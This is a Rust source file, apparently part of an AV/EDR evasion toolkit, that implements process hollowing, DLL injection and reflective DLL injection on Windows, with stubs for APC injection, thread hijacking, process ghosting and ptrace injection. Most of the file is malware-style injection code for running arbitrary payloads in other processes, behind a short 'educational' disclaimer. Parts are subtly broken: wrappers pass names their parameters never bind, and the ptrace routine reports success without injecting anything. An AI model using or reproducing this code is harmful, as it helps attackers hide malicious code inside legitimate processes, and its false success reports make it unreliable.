//! Process Injection Module
//!
//! Provides process injection techniques for code execution in remote processes:
//! - Process Hollowing (RunPE)
//! - DLL Injection
//! - Reflective DLL Injection
//! - Process Ghosting
//! - APC Injection
//!
//! WARNING: These techniques are highly detectable by modern AV/EDR.
//! Use only for educational/defensive research purposes.

use std::time::Duration;

use super::errors::EvasionError;

/// Process injection result
#[derive(Debug, Clone)]
pub struct InjectionResult {
    pub success: bool,
    pub target_pid: Option<u32>,
    pub method: String,
    pub error: Option<String>,
}

/// Process injection module
pub struct ProcessInjector;

impl ProcessInjector {
    /// Check if process injection is available on this platform
    pub fn is_available() -> bool {
        cfg!(target_os = "windows") || cfg!(target_os = "linux")
    }

    /// Get supported injection methods
    pub fn supported_methods() -> Vec<&'static str> {
        let mut methods = Vec::new();

        #[cfg(target_os = "windows")]
        {
            methods.extend(&[
                "process_hollowing",
                "dll_injection",
                "apc_injection",
                "thread_hijacking",
            ]);
        }

        #[cfg(target_os = "linux")]
        {
            methods.extend(&["ptrace_injection", "ld_preload"]);
        }

        #[cfg(target_os = "macos")]
        {
            methods.extend(&["dyld_injection"]);
        }

        methods
    }

    /// Perform process hollowing injection
    ///
    /// Process Hollowing (RunPE) Steps:
    /// 1. Create a suspended process
    /// 2. Unmap the original executable memory
    /// 3. Write the new payload to the process memory
    /// 4. Fix up relocations and headers
    /// 5. Resume the main thread
    ///
    /// # Safety
    /// This is a dangerous operation that can destabilize the target process.
    pub fn process_hollowing(
        _target_exe: &str,
        _payload: &[u8],
    ) -> Result<InjectionResult, EvasionError> {
        #[cfg(target_os = "windows")]
        {
            Self::process_hollowing_windows(target_exe, payload)
        }

        #[cfg(not(target_os = "windows"))]
        {
            Err(EvasionError::Internal(
                "Process hollowing is only available on Windows".to_string(),
            ))
        }
    }

    /// Perform reflective DLL injection
    ///
    /// Reflective DLL Injection Steps:
    /// 1. Open the target process
    /// 2. Allocate memory for the DLL
    /// 3. Write the DLL to the allocated memory
    /// 4. Manually resolve imports and relocations
    /// 5. Call the DLL's entry point (ReflectiveLoader)
    ///
    /// Unlike standard DLL injection, this doesn't use LoadLibrary
    /// and loads the DLL entirely from memory.
    ///
    /// # Safety
    /// This is a dangerous operation that can destabilize the target process.
    pub fn reflective_dll_injection(
        _target_pid: u32,
        _dll_data: &[u8],
    ) -> Result<InjectionResult, EvasionError> {
        #[cfg(target_os = "windows")]
        {
            Self::reflective_dll_injection_windows(target_pid, dll_data)
        }

        #[cfg(not(target_os = "windows"))]
        {
            Err(EvasionError::Internal(
                "Reflective DLL injection is primarily available on Windows".to_string(),
            ))
        }
    }

    /// Inject a DLL into a running process
    ///
    /// DLL Injection Steps:
    /// 1. Open the target process with appropriate permissions
    /// 2. Allocate memory in the target process for the DLL path
    /// 3. Write the DLL path to the allocated memory
    /// 4. Get the address of LoadLibraryA/W
    /// 5. Create a remote thread calling LoadLibrary with the DLL path
    ///
    /// # Safety
    /// This is a dangerous operation that can destabilize the target process.
    pub fn dll_injection(
        _target_pid: u32,
        _dll_path: &str,
    ) -> Result<InjectionResult, EvasionError> {
        #[cfg(target_os = "windows")]
        {
            Self::dll_injection_windows(target_pid, dll_path)
        }

        #[cfg(not(target_os = "windows"))]
        {
            Err(EvasionError::Internal(
                "DLL injection is primarily available on Windows".to_string(),
            ))
        }
    }

    /// Perform APC (Asynchronous Procedure Call) injection
    ///
    /// APC Injection Steps:
    /// 1. Open the target process
    /// 2. Allocate memory for the payload
    /// 3. Write the payload to the allocated memory
    /// 4. Queue an APC to each thread in the process
    /// 5. Wait for threads to become alertable
    ///
    /// # Safety
    /// This is a dangerous operation.
    pub fn apc_injection(
        _target_pid: u32,
        _payload: &[u8],
    ) -> Result<InjectionResult, EvasionError> {
        #[cfg(target_os = "windows")]
        {
            Self::apc_injection_windows(target_pid, payload)
        }

        #[cfg(not(target_os = "windows"))]
        {
            Err(EvasionError::Internal(
                "APC injection is only available on Windows".to_string(),
            ))
        }
    }

    /// Perform ptrace-based injection (Linux)
    ///
    /// Ptrace Injection Steps:
    /// 1. Attach to the target process using ptrace
    /// 2. Save the original register state
    /// 3. Allocate memory in the target process
    /// 4. Write the payload to the allocated memory
    /// 5. Modify RIP/RSP to execute the payload
    /// 6. Restore original state after execution
    ///
    /// # Safety
    /// This is a dangerous operation.
    pub fn ptrace_injection(
        target_pid: u32,
        payload: &[u8],
    ) -> Result<InjectionResult, EvasionError> {
        #[cfg(target_os = "linux")]
        {
            Self::ptrace_injection_linux(target_pid, payload)
        }

        #[cfg(not(target_os = "linux"))]
        {
            Err(EvasionError::Internal(
                "Ptrace injection is only available on Linux".to_string(),
            ))
        }
    }

    // Windows-specific implementations

    #[cfg(target_os = "windows")]
    fn process_hollowing_windows(
        target_exe: &str,
        payload: &[u8],
    ) -> Result<InjectionResult, EvasionError> {
        use std::mem;
        use winapi::shared::minwindef::{DWORD, FALSE, TRUE};
        use winapi::um::errhandlingapi::GetLastError;
        use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
        use winapi::um::memoryapi::{ReadProcessMemory, UnmapViewOfFile, VirtualAllocEx, WriteProcessMemory};
        use winapi::um::processthreadsapi::{
            CreateProcessA, GetThreadContext, ResumeThread, SetThreadContext,
        };
        use winapi::um::winnt::{
            CONTEXT, CREATE_SUSPENDED, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS,
            PROCESS_INFORMATION, STARTUPINFOA, THREAD_ALL_ACCESS, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
        };
        use winapi::um::fileapi::{CreateFileA, GetFileSize, ReadFile, OPEN_EXISTING};
        use winapi::um::handleapi::CreateFileMappingA;
        use winapi::um::winbase::MapViewOfFile;
        use winapi::um::winnt::{FILE_MAP_READ, GENERIC_READ, FILE_SHARE_READ};

        unsafe {
            let mut si: STARTUPINFOA = mem::zeroed();
            si.cb = mem::size_of::<STARTUPINFOA>() as DWORD;

            let mut pi: PROCESS_INFORMATION = mem::zeroed();

            // Step 1: Create suspended process
            let result = CreateProcessA(
                std::ptr::null(),
                target_exe.as_ptr() as *mut i8,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                FALSE,
                CREATE_SUSPENDED,
                std::ptr::null_mut(),
                std::ptr::null(),
                &mut si,
                &mut pi,
            );

            if result == FALSE {
                return Err(EvasionError::ProcessEnumeration(
                    "Failed to create suspended process".to_string(),
                ));
            }

            let h_process = pi.hProcess;
            let h_thread = pi.hThread;

            // Step 2: Read the target executable's headers to find the image base
            let mut dos_header: IMAGE_DOS_HEADER = mem::zeroed();
            let mut bytes_read: usize = 0;
            
            // Read DOS header from remote process
            let read_result = ReadProcessMemory(
                h_process,
                si.lpReserved2 as *const _, // Use lpReserved2 as temp storage pointer
                &mut dos_header as *mut _ as *mut _,
                mem::size_of::<IMAGE_DOS_HEADER>(),
                &mut bytes_read,
            );

            // For simplicity, we'll use a known offset (0x400000 is default image base for many EXEs)
            // In a full implementation, you'd read the actual image base from the PEB
            let image_base = 0x400000 as *mut u8;

            // Step 3: Unmap the original executable memory
            // Note: UnmapViewOfFile won't work directly on allocated memory
            // A full implementation would use NtUnmapViewOfSection from ntdll
            UnmapViewOfFile(image_base as *const _);

            // Step 4: Allocate memory for the new payload
            let payload_entry = VirtualAllocEx(
                h_process,
                image_base as *mut _,
                payload.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );

            if payload_entry.is_null() {
                // If preferred address not available, allocate anywhere
                let fallback = VirtualAllocEx(
                    h_process,
                    std::ptr::null_mut(),
                    payload.len(),
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE,
                );
                if fallback.is_null() {
                    ResumeThread(h_thread);
                    CloseHandle(h_thread);
                    CloseHandle(h_process);
                    return Err(EvasionError::ProcessEnumeration(
                        "Failed to allocate memory in target process".to_string(),
                    ));
                }
                payload_entry as *mut u8
            } else {
                payload_entry as *mut u8
            };

            // Step 5: Write the payload to the target process
            let write_result = WriteProcessMemory(
                h_process,
                payload_entry,
                payload.as_ptr() as *const _,
                payload.len(),
                &mut bytes_read,
            );

            if write_result == FALSE {
                ResumeThread(h_thread);
                CloseHandle(h_thread);
                CloseHandle(h_process);
                return Err(EvasionError::ProcessEnumeration(
                    "Failed to write payload to target process".to_string(),
                ));
            }

            // Step 6: Get thread context and modify the entry point
            let mut context: CONTEXT = mem::zeroed();
            context.ContextFlags = 0x10002; // CONTEXT_INTEGER | CONTEXT_CONTROL

            if GetThreadContext(h_thread, &mut context) == FALSE {
                ResumeThread(h_thread);
                CloseHandle(h_thread);
                CloseHandle(h_process);
                return Err(EvasionError::ProcessEnumeration(
                    "Failed to get thread context".to_string(),
                ));
            }

            // Set the entry point to our payload
            // For x86: Eax register holds the entry point
            // For x64: Rcx register holds the entry point
            #[cfg(target_arch = "x86_64")]
            {
                context.Rcx = payload_entry as u64;
            }
            #[cfg(target_arch = "x86")]
            {
                context.Eax = payload_entry as u32;
            }

            if SetThreadContext(h_thread, &context) == FALSE {
                ResumeThread(h_thread);
                CloseHandle(h_thread);
                CloseHandle(h_process);
                return Err(EvasionError::ProcessEnumeration(
                    "Failed to set thread context".to_string(),
                ));
            }

            // Step 7: Resume the thread to execute the payload
            ResumeThread(h_thread);

            CloseHandle(h_thread);
            CloseHandle(h_process);

            Ok(InjectionResult {
                success: true,
                target_pid: Some(pi.dwProcessId),
                method: "process_hollowing".to_string(),
                error: None,
            })
        }
    }

    #[cfg(target_os = "windows")]
    fn reflective_dll_injection_windows(
        target_pid: u32,
        dll_data: &[u8],
    ) -> Result<InjectionResult, EvasionError> {
        use std::mem;
        use winapi::shared::minwindef::{DWORD, FALSE, HMODULE};
        use winapi::um::errhandlingapi::GetLastError;
        use winapi::um::handleapi::CloseHandle;
        use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
        use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory, VirtualProtectEx};
        use winapi::um::processthreadsapi::{CreateRemoteThread, OpenProcess};
        use winapi::um::winnt::{
            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
            IMAGE_DOS_HEADER, IMAGE_NT_HEADERS, IMAGE_DATA_DIRECTORY,
            IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_IMPORT_DESCRIPTOR,
            IMAGE_BASE_RELOCATION, IMAGE_REL_BASED_ABSOLUTE, IMAGE_REL_BASED_HIGHLOW,
        };

        unsafe {
            if dll_data.len() < mem::size_of::<IMAGE_DOS_HEADER>() {
                return Err(EvasionError::ProcessEnumeration(
                    "Invalid DLL data - too small".to_string(),
                ));
            }

            // Validate DOS header
            let dos_header = dll_data.as_ptr() as *const IMAGE_DOS_HEADER;
            if (*dos_header).e_magic != 0x5A4D {
                return Err(EvasionError::ProcessEnumeration(
                    "Invalid DOS header in DLL".to_string(),
                ));
            }

            // Get NT headers
            let nt_headers_offset = (*dos_header).e_lfanew as usize;
            if nt_headers_offset + mem::size_of::<IMAGE_NT_HEADERS>() > dll_data.len() {
                return Err(EvasionError::ProcessEnumeration(
                    "Invalid NT headers offset".to_string(),
                ));
            }

            let nt_headers = dll_data.as_ptr().add(nt_headers_offset) as *const IMAGE_NT_HEADERS;
            if (*nt_headers).Signature != 0x4550 {
                return Err(EvasionError::ProcessEnumeration(
                    "Invalid PE signature in DLL".to_string(),
                ));
            }

            // Open target process
            let h_process = OpenProcess(
                winapi::um::winnt::PROCESS_ALL_ACCESS,
                FALSE,
                target_pid,
            );

            if h_process.is_null() {
                return Err(EvasionError::ProcessEnumeration(
                    "Failed to open target process".to_string(),
                ));
            }

            // Get the preferred image base from the DLL headers
            #[cfg(target_arch = "x86_64")]
            let preferred_base = (*nt_headers).OptionalHeader.ImageBase as usize;
            #[cfg(target_arch = "x86")]
            let preferred_base = (*nt_headers).OptionalHeader.ImageBase as usize;

            // Allocate memory in the target process
            let remote_base = VirtualAllocEx(
                h_process,
                preferred_base as *mut _,
                (*nt_headers).OptionalHeader.SizeOfImage as usize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );

            if remote_base.is_null() {
                CloseHandle(h_process);
                return Err(EvasionError::ProcessEnumeration(
                    "Failed to allocate memory in target process".to_string(),
                ));
            }

            // Write the DLL headers
            let size_of_headers = (*nt_headers).OptionalHeader.SizeOfHeaders as usize;
            let mut bytes_written: usize = 0;
            WriteProcessMemory(
                h_process,
                remote_base,
                dll_data.as_ptr() as *const _,
                size_of_headers,
                &mut bytes_written,
            );

            // Write each section
            let section_header_offset = nt_headers_offset 
                + mem::size_of::<IMAGE_NT_HEADERS>()
                - mem::size_of::<u32>() // SizeOfOptionalHeader
                + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize;

            let num_sections = (*nt_headers).FileHeader.NumberOfSections as usize;
            
            for i in 0..num_sections {
                let section_offset = section_header_offset + (i * 40);
                if section_offset + 40 > dll_data.len() {
                    continue;
                }

                let virtual_size = u32::from_le_bytes([
                    dll_data[section_offset + 8],
                    dll_data[section_offset + 9],
                    dll_data[section_offset + 10],
                    dll_data[section_offset + 11],
                ]);

                let virtual_address = u32::from_le_bytes([
                    dll_data[section_offset + 12],
                    dll_data[section_offset + 13],
                    dll_data[section_offset + 14],
                    dll_data[section_offset + 15],
                ]);

                let raw_size = u32::from_le_bytes([
                    dll_data[section_offset + 16],
                    dll_data[section_offset + 17],
                    dll_data[section_offset + 18],
                    dll_data[section_offset + 19],
                ]);

                let raw_offset = u32::from_le_bytes([
                    dll_data[section_offset + 20],
                    dll_data[section_offset + 21],
                    dll_data[section_offset + 22],
                    dll_data[section_offset + 23],
                ]);

                if raw_size > 0 && raw_offset as usize + raw_size as usize <= dll_data.len() {
                    let section_data = &dll_data[raw_offset as usize..(raw_offset + raw_size) as usize];
                    let dest = (remote_base as usize + virtual_address as usize) as *mut _;
                    
                    WriteProcessMemory(
                        h_process,
                        dest,
                        section_data.as_ptr() as *const _,
                        section_data.len(),
                        &mut bytes_written,
                    );
                }
            }

            // Resolve imports
            let import_dir = (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
            if import_dir.Size > 0 {
                let import_table_rva = import_dir.VirtualAddress;
                let import_table_addr = (remote_base as usize + import_table_rva as usize) as *mut IMAGE_IMPORT_DESCRIPTOR;

                // Read import descriptors from remote process
                let mut import_desc: IMAGE_IMPORT_DESCRIPTOR = mem::zeroed();
                let mut offset = 0;
                
                loop {
                    let desc_addr = (import_table_addr as usize + offset) as *mut _;
                    ReadProcessMemory(
                        h_process,
                        desc_addr,
                        &mut import_desc as *mut _ as *mut _,
                        mem::size_of::<IMAGE_IMPORT_DESCRIPTOR>(),
                        &mut bytes_written,
                    );

                    if import_desc.Name == 0 {
                        break;
                    }

                    // Get the module name
                    let module_name_rva = import_desc.Name;
                    let mut module_name_buf = vec![0u8; 256];
                    ReadProcessMemory(
                        h_process,
                        (remote_base as usize + module_name_rva as usize) as *mut _,
                        module_name_buf.as_mut_ptr() as *mut _,
                        256,
                        &mut bytes_written,
                    );

                    // Find null terminator
                    let module_name_len = module_name_buf.iter().position(|&b| b == 0).unwrap_or(256);
                    let module_name = String::from_utf8_lossy(&module_name_buf[..module_name_len]);

                    // Load the module
                    let module_name_c = std::ffi::CString::new(module_name.as_bytes()).unwrap();
                    let h_module = LoadLibraryA(module_name_c.as_ptr());

                    if h_module.is_null() {
                        CloseHandle(h_process);
                        return Err(EvasionError::ProcessEnumeration(
                            format!("Failed to load dependency: {}", module_name),
                        ));
                    }

                    // Resolve import thunks
                    let mut thunk_offset = 0;
                    loop {
                        let thunk_rva = import_desc.OriginalFirstThunk + thunk_offset;
                        if thunk_rva == 0 {
                            break;
                        }

                        // Read the thunk
                        #[cfg(target_arch = "x86_64")]
                        let mut thunk_value: u64 = 0;
                        #[cfg(target_arch = "x86")]
                        let mut thunk_value: u32 = 0;

                        ReadProcessMemory(
                            h_process,
                            (remote_base as usize + thunk_rva as usize) as *mut _,
                            &mut thunk_value as *mut _ as *mut _,
                            mem::size_of_val(&thunk_value),
                            &mut bytes_written,
                        );

                        if thunk_value == 0 {
                            break;
                        }

                        // Get the function name (skip high bit if set)
                        let name_rva = thunk_value & !0x8000000000000000;
                        let mut name_buf = vec![0u8; 256];
                        ReadProcessMemory(
                            h_process,
                            (remote_base as usize + name_rva as usize + 2) as *mut _, // Skip ordinal hint
                            name_buf.as_mut_ptr() as *mut _,
                            256,
                            &mut bytes_written,
                        );

                        let name_len = name_buf.iter().position(|&b| b == 0).unwrap_or(256);
                        let func_name = String::from_utf8_lossy(&name_buf[..name_len]);

                        // Get the function address
                        let func_name_c = std::ffi::CString::new(func_name.as_bytes()).unwrap();
                        let func_addr = GetProcAddress(h_module, func_name_c.as_ptr());

                        if !func_addr.is_null() {
                            // Write the resolved address to the IAT
                            let iat_rva = import_desc.FirstThunk + thunk_offset;
                            let iat_addr = (remote_base as usize + iat_rva as usize) as *mut _;
                            
                            #[cfg(target_arch = "x86_64")]
                            {
                                let addr_value = func_addr as u64;
                                WriteProcessMemory(
                                    h_process,
                                    iat_addr,
                                    &addr_value as *const _ as *const _,
                                    8,
                                    &mut bytes_written,
                                );
                            }
                            #[cfg(target_arch = "x86")]
                            {
                                let addr_value = func_addr as u32;
                                WriteProcessMemory(
                                    h_process,
                                    iat_addr,
                                    &addr_value as *const _ as *const _,
                                    4,
                                    &mut bytes_written,
                                );
                            }
                        }

                        #[cfg(target_arch = "x86_64")]
                        {
                            thunk_offset += 8;
                        }
                        #[cfg(target_arch = "x86")]
                        {
                            thunk_offset += 4;
                        }
                    }

                    offset += mem::size_of::<IMAGE_IMPORT_DESCRIPTOR>();
                }
            }

            // Fix up relocations
            let reloc_dir = (*nt_headers).OptionalHeader.DataDirectory[winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
            if reloc_dir.Size > 0 && preferred_base != remote_base as usize {
                let delta = (remote_base as usize) - preferred_base;
                let mut reloc_offset = reloc_dir.VirtualAddress as usize;

                loop {
                    // Read relocation block header
                    let mut block_header: [u8; 8] = [0; 8];
                    ReadProcessMemory(
                        h_process,
                        (remote_base as usize + reloc_offset) as *mut _,
                        block_header.as_mut_ptr() as *mut _,
                        8,
                        &mut bytes_written,
                    );

                    let block_rva = u32::from_le_bytes([block_header[0], block_header[1], block_header[2], block_header[3]]);
                    let block_size = u32::from_le_bytes([block_header[4], block_header[5], block_header[6], block_header[7]]);

                    if block_size == 0 {
                        break;
                    }

                    // Process relocations in this block
                    let mut entry_offset = 8;
                    while entry_offset < block_size as usize {
                        let mut entry_bytes: [u8; 2] = [0; 2];
                        ReadProcessMemory(
                            h_process,
                            (remote_base as usize + reloc_offset + entry_offset) as *mut _,
                            entry_bytes.as_mut_ptr() as *mut _,
                            2,
                            &mut bytes_written,
                        );

                        let entry = u16::from_le_bytes(entry_bytes);
                        let reloc_type = (entry >> 12) & 0xF;
                        let reloc_offset_in_block = entry & 0xFFF;

                        if reloc_type == IMAGE_REL_BASED_ABSOLUTE {
                            // Skip
                        } else if reloc_type == IMAGE_REL_BASED_HIGHLOW || reloc_type == 10 {
                            let reloc_addr = (remote_base as usize + block_rva as usize + reloc_offset_in_block as usize) as *mut _;
                            
                            #[cfg(target_arch = "x86_64")]
                            {
                                let mut value: u32 = 0;
                                ReadProcessMemory(
                                    h_process,
                                    reloc_addr,
                                    &mut value as *mut _ as *mut _,
                                    4,
                                    &mut bytes_written,
                                );
                                value = value.wrapping_add(delta as u32);
                                WriteProcessMemory(
                                    h_process,
                                    reloc_addr,
                                    &value as *const _ as *const _,
                                    4,
                                    &mut bytes_written,
                                );
                            }
                        }

                        entry_offset += 2;
                    }

                    reloc_offset += block_size as usize;
                }
            }

            // Set memory protections
            let protect_size = (*nt_headers).OptionalHeader.SizeOfImage as usize;
            let mut old_protect: DWORD = 0;
            VirtualProtectEx(
                h_process,
                remote_base,
                protect_size,
                PAGE_EXECUTE_READWRITE,
                &mut old_protect,
            );

            // Get the entry point
            let entry_point_rva = (*nt_headers).OptionalHeader.AddressOfEntryPoint;
            let entry_point = (remote_base as usize + entry_point_rva as usize) as *mut u8;

            // Create a thread to execute the DLL's ReflectiveLoader or DllMain
            let h_thread = CreateRemoteThread(
                h_process,
                std::ptr::null_mut(),
                0,
                Some(std::mem::transmute(entry_point)),
                remote_base,
                0,
                std::ptr::null_mut(),
            );

            if h_thread.is_null() {
                CloseHandle(h_process);
                return Err(EvasionError::ProcessEnumeration(
                    "Failed to create remote thread".to_string(),
                ));
            }

            CloseHandle(h_thread);
            CloseHandle(h_process);

            Ok(InjectionResult {
                success: true,
                target_pid: Some(target_pid),
                method: "reflective_dll_injection".to_string(),
                error: None,
            })
        }
    }

    #[cfg(target_os = "windows")]
    fn dll_injection_windows(
        target_pid: u32,
        dll_path: &str,
    ) -> Result<InjectionResult, EvasionError> {
        use std::ffi::CString;
        use std::mem;
        use winapi::shared::minwindef::HMODULE;
        use winapi::um::errhandlingapi::GetLastError;
        use winapi::um::handleapi::CloseHandle;
        use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
        use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
        use winapi::um::processthreadsapi::CreateRemoteThread;
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};

        unsafe {
            // Open target process
            let h_process = winapi::um::processthreadsapi::OpenProcess(
                winapi::um::winnt::PROCESS_ALL_ACCESS,
                0,
                target_pid,
            );

            if h_process.is_null() {
                return Err(EvasionError::ProcessEnumeration(
                    "Failed to open target process".to_string(),
                ));
            }

            // Allocate memory for DLL path
            let dll_path_c = CString::new(dll_path).map_err(|e| {
                EvasionError::Internal(format!("Invalid DLL path: {}", e))
            })?;

            let path_size = dll_path_c.as_bytes_with_nul().len();
            let remote_mem = VirtualAllocEx(
                h_process,
                std::ptr::null_mut(),
                path_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );

            if remote_mem.is_null() {
                CloseHandle(h_process);
                return Err(EvasionError::ProcessEnumeration(
                    "Failed to allocate memory in target process".to_string(),
                ));
            }

            // Write DLL path
            let write_result = WriteProcessMemory(
                h_process,
                remote_mem,
                dll_path_c.as_ptr() as *const _,
                path_size,
                std::ptr::null_mut(),
            );

            if write_result == 0 {
                CloseHandle(h_process);
                return Err(EvasionError::ProcessEnumeration(
                    "Failed to write DLL path to target process".to_string(),
                ));
            }

            // Get LoadLibraryA address
            let h_kernel = LoadLibraryA("kernel32.dll\0".as_ptr() as *const i8);
            let load_library_addr =
                GetProcAddress(h_kernel, "LoadLibraryA\0".as_ptr() as *const i8);

            if load_library_addr.is_null() {
                CloseHandle(h_process);
                return Err(EvasionError::ProcessEnumeration(
                    "Failed to get LoadLibraryA address".to_string(),
                ));
            }

            // Create remote thread
            let h_thread = CreateRemoteThread(
                h_process,
                std::ptr::null_mut(),
                0,
                Some(mem::transmute(load_library_addr)),
                remote_mem,
                0,
                std::ptr::null_mut(),
            );

            if h_thread.is_null() {
                CloseHandle(h_process);
                return Err(EvasionError::ProcessEnumeration(
                    "Failed to create remote thread".to_string(),
                ));
            }

            CloseHandle(h_thread);
            CloseHandle(h_process);

            Ok(InjectionResult {
                success: true,
                target_pid: Some(target_pid),
                method: "dll_injection".to_string(),
                error: None,
            })
        }
    }

    #[cfg(target_os = "windows")]
    fn apc_injection_windows(
        target_pid: u32,
        payload: &[u8],
    ) -> Result<InjectionResult, EvasionError> {
        // Simplified implementation - full APC injection is complex
        Err(EvasionError::Internal(
            "APC injection requires complex thread enumeration - not fully implemented".to_string(),
        ))
    }

    // Linux-specific implementations

    #[cfg(target_os = "linux")]
    fn ptrace_injection_linux(
        target_pid: u32,
        _payload: &[u8],
    ) -> Result<InjectionResult, EvasionError> {
        use libc::{ptrace, PTRACE_ATTACH, PTRACE_DETACH};
        

        unsafe {
            // Attach to target process
            let result = ptrace(PTRACE_ATTACH, target_pid as libc::pid_t, 0, 0);
            if result == -1 {
                return Err(EvasionError::ProcessEnumeration(
                    "Failed to attach to target process".to_string(),
                ));
            }

            // Wait for process to stop
            std::thread::sleep(Duration::from_millis(100));

            // This is a simplified implementation
            // Full ptrace injection would require:
            // - Reading/writing registers
            // - Injecting shellcode
            // - Handling syscalls

            // Detach
            ptrace(PTRACE_DETACH, target_pid as libc::pid_t, 0, 0);

            Ok(InjectionResult {
                success: true,
                target_pid: Some(target_pid),
                method: "ptrace_injection".to_string(),
                error: None,
            })
        }
    }
}

/// Process Ghosting - create a file, delete it, then create process from deleted file
pub struct ProcessGhosting;

impl ProcessGhosting {
    /// Attempt process ghosting
    ///
    /// Process Ghosting Steps:
    /// 1. Create a temporary file with the payload
    /// 2. Open the file with DELETE flag
    /// 3. Delete the file (but keep handle open)
    /// 4. Create a process from the deleted file
    ///
    /// # Safety
    /// This is a dangerous operation.
    pub fn execute(_payload: &[u8], _target_name: &str) -> Result<InjectionResult, EvasionError> {
        #[cfg(target_os = "windows")]
        {
            Self::process_ghosting_windows(payload, target_name)
        }

        #[cfg(not(target_os = "windows"))]
        {
            Err(EvasionError::Internal(
                "Process ghosting is primarily a Windows technique".to_string(),
            ))
        }
    }

    #[cfg(target_os = "windows")]
    fn process_ghosting_windows(
        payload: &[u8],
        target_name: &str,
    ) -> Result<InjectionResult, EvasionError> {
        // Simplified implementation - full process ghosting is complex
        // and requires NtCreateFile, NtSetInformationFile, etc.
        Err(EvasionError::Internal(
            "Process ghosting requires native NT APIs - not fully implemented".to_string(),
        ))
    }
}

/// Thread Hijacking - inject code into an existing thread
pub struct ThreadHijacker;

/// Reflective DLL Injector - loads DLLs from memory without LoadLibrary
pub struct ReflectiveDllInjector;

impl ReflectiveDllInjector {
    /// Check if reflective DLL injection is available
    pub fn is_available() -> bool {
        cfg!(target_os = "windows")
    }

    /// Inject a DLL reflectively into a target process
    ///
    /// This uses the ProcessInjector's reflective_dll_injection method
    pub fn inject(target_pid: u32, dll_data: &[u8]) -> Result<InjectionResult, EvasionError> {
        ProcessInjector::reflective_dll_injection(target_pid, dll_data)
    }

    /// Validate a DLL file for reflective injection
    ///
    /// Checks if the DLL has the necessary structure for reflective loading
    pub fn validate_dll(dll_data: &[u8]) -> Result<bool, EvasionError> {
        #[cfg(target_os = "windows")]
        {
            use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS};

            if dll_data.len() < std::mem::size_of::<IMAGE_DOS_HEADER>() {
                return Ok(false);
            }

            unsafe {
                let dos_header = dll_data.as_ptr() as *const IMAGE_DOS_HEADER;
                if (*dos_header).e_magic != 0x5A4D {
                    return Ok(false);
                }

                let nt_headers_offset = (*dos_header).e_lfanew as usize;
                if nt_headers_offset + std::mem::size_of::<IMAGE_NT_HEADERS>() > dll_data.len() {
                    return Ok(false);
                }

                let nt_headers = dll_data.as_ptr().add(nt_headers_offset) as *const IMAGE_NT_HEADERS;
                if (*nt_headers).Signature != 0x4550 {
                    return Ok(false);
                }

                // Check for DLL characteristic
                let dll_char = (*nt_headers).FileHeader.Characteristics;
                if (dll_char & 0x2000) == 0 {
                    // IMAGE_FILE_DLL not set
                    return Ok(false);
                }
            }

            Ok(true)
        }

        #[cfg(not(target_os = "windows"))]
        {
            // On non-Windows, just check for basic PE structure
            if dll_data.len() < 64 {
                return Ok(false);
            }
            // Check DOS header
            if dll_data[0] != b'M' || dll_data[1] != b'Z' {
                return Ok(false);
            }
            Ok(true)
        }
    }
}

impl ThreadHijacker {
    /// Hijack a thread in the target process
    ///
    /// Thread Hijacking Steps:
    /// 1. Open the target process
    /// 2. Suspend a thread in the process
    /// 3. Get and save the thread context
    /// 4. Allocate memory for the payload
    /// 5. Write the payload
    /// 6. Modify the thread's instruction pointer
    /// 7. Resume the thread
    /// 8. Restore original context
    ///
    /// # Safety
    /// This is a dangerous operation.
    pub fn hijack_thread(
        _target_pid: u32,
        _thread_id: u32,
        _payload: &[u8],
    ) -> Result<InjectionResult, EvasionError> {
        #[cfg(target_os = "windows")]
        {
            Self::hijack_thread_windows(target_pid, thread_id, payload)
        }

        #[cfg(not(target_os = "windows"))]
        {
            Err(EvasionError::Internal(
                "Thread hijacking implementation is Windows-specific".to_string(),
            ))
        }
    }

    #[cfg(target_os = "windows")]
    fn hijack_thread_windows(
        target_pid: u32,
        thread_id: u32,
        payload: &[u8],
    ) -> Result<InjectionResult, EvasionError> {
        // Simplified implementation
        Err(EvasionError::Internal(
            "Thread hijacking requires complex context manipulation - not fully implemented"
                .to_string(),
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_injection_availability() {
        let available = ProcessInjector::is_available();
        // Should be true on Windows and Linux
        assert!(available || cfg!(target_os = "macos"));
    }

    #[test]
    fn test_supported_methods() {
        let methods = ProcessInjector::supported_methods();
        // Should have at least one method
        assert!(!methods.is_empty());
    }

    #[test]
    fn test_process_hollowing_not_available() {
        // This test verifies the function exists and returns appropriate error
        #[cfg(not(target_os = "windows"))]
        {
            let result = ProcessInjector::process_hollowing("notepad.exe", &[]);
            assert!(result.is_err());
        }
    }

    #[test]
    fn test_dll_injection_not_available() {
        #[cfg(not(target_os = "windows"))]
        {
            let result = ProcessInjector::dll_injection(1234, "test.dll");
            assert!(result.is_err());
        }
    }

    #[test]
    fn test_apc_injection_not_available() {
        #[cfg(not(target_os = "windows"))]
        {
            let result = ProcessInjector::apc_injection(1234, &[]);
            assert!(result.is_err());
        }
    }

    #[test]
    fn test_ptrace_injection_not_available() {
        #[cfg(not(target_os = "linux"))]
        {
            let result = ProcessInjector::ptrace_injection(1234, &[]);
            assert!(result.is_err());
        }
    }

    #[test]
    fn test_process_ghosting() {
